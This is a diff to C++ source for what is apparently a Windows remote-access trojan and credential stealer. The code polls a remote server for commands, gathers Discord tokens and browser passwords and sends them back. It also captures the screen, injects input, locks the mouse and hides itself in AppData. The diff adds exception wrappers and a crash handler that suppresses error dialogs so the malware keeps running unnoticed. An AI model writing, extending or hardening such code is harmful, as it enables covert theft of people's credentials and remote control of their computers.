@@ -1322,8 +1322,10 @@ void killProcessByName(const char* name) {
 }
 
 DWORD WINAPI mouseLock10(LPVOID) {
+    try {
     DWORD start = GetTickCount();
     while (GetTickCount() - start < 10000) { SetCursorPos(0, 0); Sleep(30); }
+    } catch(...) {}
     return 0;
 }
 
@@ -1468,6 +1470,7 @@ std::string uninstallSelf() {
 }
 
 DWORD WINAPI pollThread(LPVOID) {
+    try {
     Sleep(3000);
     try{if(!g_noPing)sendPing();}catch(...){}
     int pingCtr=0;
@@ -1551,21 +1554,27 @@ DWORD WINAPI pollThread(LPVOID) {
                     } else if (type == "discord_tokens") {
                         std::string k = key;
                         CreateThread(0, 0, [](LPVOID p) -> DWORD {
+                            try {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getDiscordTokens());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
                             httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d; return 0;
+                            delete d;
+                            } catch(...) {}
+                            return 0;
                         }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
                         result = "processing";
                     } else if (type == "browser_passwords") {
                         std::string k = key;
                         CreateThread(0, 0, [](LPVOID p) -> DWORD {
+                            try {
                             auto* d = (std::pair<std::string,std::string>*)p;
                             std::string r = jsonEscape(getBrowserPasswords());
                             std::string b = "{\"status\":\"done\",\"result\":\"" + r + "\"}";
                             httpsPatch("/commands/" + fbEsc(d->first) + "/" + d->second + ".json", b);
-                            delete d; return 0;
+                            delete d;
+                            } catch(...) {}
+                            return 0;
                         }, new std::pair<std::string,std::string>(computerName, key), 0, 0);
                         result = "processing";
                     } else if (type == "passwords") result = getPasswords();
@@ -1600,10 +1609,12 @@ DWORD WINAPI pollThread(LPVOID) {
             }
         } catch(...) {}
     }
+    } catch(...) {}
     return 0;
 }
 
 DWORD WINAPI screenThread(LPVOID) {
+    try {
     Sleep(3000);
     while(true) {
         DWORD t0 = GetTickCount();
@@ -1618,10 +1629,12 @@ DWORD WINAPI screenThread(LPVOID) {
         DWORD elapsed = GetTickCount() - t0;
         if (elapsed < 100) Sleep(100 - elapsed);
     }
+    } catch(...) {}
     return 0;
 }
 
 DWORD WINAPI inputThread(LPVOID) {
+    try {
     Sleep(3000);
     while(true) {
         Sleep(15);
@@ -1656,6 +1669,7 @@ DWORD WINAPI inputThread(LPVOID) {
             if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
         } catch(...) {}
     }
+    } catch(...) {}
     return 0;
 }
 
@@ -1687,7 +1701,14 @@ void hideToAppData() {
     }
 }
 
+LONG WINAPI crashHandler(EXCEPTION_POINTERS*) {
+    // Suppress crash, let threads restart via watchdog
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
 int main(int argc, char* argv[]) {
+    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
+    SetUnhandledExceptionFilter(crashHandler);
     bool noScreen = false, showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
@@ -1710,6 +1731,7 @@ int main(int argc, char* argv[]) {
             g_serverHost = s;
         }
     }
+    try {
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
     CreateThread(0, 0, mouseLock10, 0, 0, 0);
@@ -1726,4 +1748,5 @@ int main(int argc, char* argv[]) {
     if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
     // Keep alive - threads do all the work
     while (true) Sleep(10000);
+    } catch(...) { return 1; }
 }
